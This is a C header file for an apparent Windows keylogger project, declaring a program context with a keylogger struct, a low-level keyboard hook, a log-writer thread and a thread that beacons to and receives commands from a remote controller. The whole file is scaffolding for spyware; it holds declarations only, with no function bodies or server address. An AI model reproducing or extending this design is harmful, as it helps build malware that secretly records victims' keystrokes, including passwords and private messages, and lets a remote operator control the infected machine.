
#include "utils.h"
#include "../keylogger/keylogger.h"
#include "../client/client.h"

#ifndef PROGRAM_H
#define PROGRAM_H

#define SLP_CMD_THREAD 22500    // 22.5s
#define SLP_WRITER_THREAD 20000 // 20s


/**
 * Structure that maintains all the important information and structures
 * utilised throughout the program
 */
typedef struct {
    CLIENT_HANDLER* client;  // client handler struct
    KEY_LOGGER* kLogger;     // keylogger struct
    HHOOK hLowLevelKeyHook;  // lowlevel key hook handle
    
    DWORD mainThreadId;   // id of the main thread
    HANDLE hCmdThread;    // handle to remote command retrieval worker thread
    HANDLE hWriteThread;  // handle to log writer thread
    HANDLE hMutexThreadSync;   // thread mutex handle
    
    BOOL shutdown;  // shutdown flag updated in the commands.c source file
} PROGRAM_CONTEXT;

extern PROGRAM_CONTEXT* progContext;  // Global program context variable

ERR_CODE setup();         // setups up client and program itself
PROGRAM_CONTEXT* initProgramContext(); // initiliase program context structure

ERR_CODE startThreads();  // initialises worker threads

// worker thread functions
DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam); // command reciever thread function
void doShutdown();   // is envoked by the command thread
DWORD WINAPI writeLogThread(LPVOID lpParam);      // key write thread function

ERR_CODE runKeyLogger();
LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

void programCleanup();    // starts program cleanup
void programContextCleanup(PROGRAM_CONTEXT* prCon); // cleans up PRORGAM_CONTEXT struct

#endif